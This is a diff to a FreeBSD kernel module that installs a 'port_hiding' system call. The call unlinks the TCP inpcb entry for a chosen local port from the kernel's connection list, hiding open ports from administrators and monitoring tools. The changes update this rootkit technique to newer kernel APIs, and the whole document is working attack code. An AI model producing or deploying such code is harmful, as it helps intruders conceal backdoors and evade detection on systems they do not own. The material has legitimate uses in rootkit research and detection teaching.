@@ -42,6 +42,7 @@
 #include <netinet/in_pcb.h>
 #include <netinet/ip_var.h>
 #include <netinet/tcp_var.h>
+#include <bsm/audit_kevents.h>
 
 struct port_hiding_args {
 	u_int16_t lport;	/* local port */
@@ -51,36 +52,38 @@ struct port_hiding_args {
 static int
 port_hiding(struct thread *td, void *syscall_args)
 {
+	struct tcpcb *tp = NULL;
 	struct port_hiding_args *uap;
 	uap = (struct port_hiding_args *)syscall_args;
 
 	struct inpcb *inpb;
 
-	INP_INFO_WLOCK(&tcbinfo);
+	INP_INFO_WLOCK(&V_tcbinfo);
 
 	/* Iterate through the TCP-based inpcb list. */
-	LIST_FOREACH(inpb, tcbinfo.listhead, inp_list) {
-		if (inpb->inp_vflag & INP_TIMEWAIT)
+	CK_LIST_FOREACH(inpb, &V_tcbinfo.ipi_listhead, inp_list) {
+		tp = intotcpcb(inpb);
+		if (tp->t_state == TCPS_TIME_WAIT)
 			continue;
 
-		INP_LOCK(inpb);
+		INP_WLOCK(inpb);
 
 		/* Do we want to hide this local open port? */
 		if (uap->lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
-			LIST_REMOVE(inpb, inp_list);
+			CK_LIST_REMOVE(inpb, inp_list);
 
-		INP_UNLOCK(inpb);
+		INP_WUNLOCK(inpb);
 	}
 
-	INP_INFO_WUNLOCK(&tcbinfo);
+	INP_INFO_WUNLOCK(&V_tcbinfo);
 
 	return(0);
 }
 
 /* The sysent for the new system call. */
 static struct sysent port_hiding_sysent = {
-	1,			/* number of arguments */
-	port_hiding		/* implementing function */
+	.sy_narg = 1,			/* number of arguments */
+	.sy_call = port_hiding		/* implementing function */
 };
 
 /* The offset in sysent[] where the system call is to be allocated. */
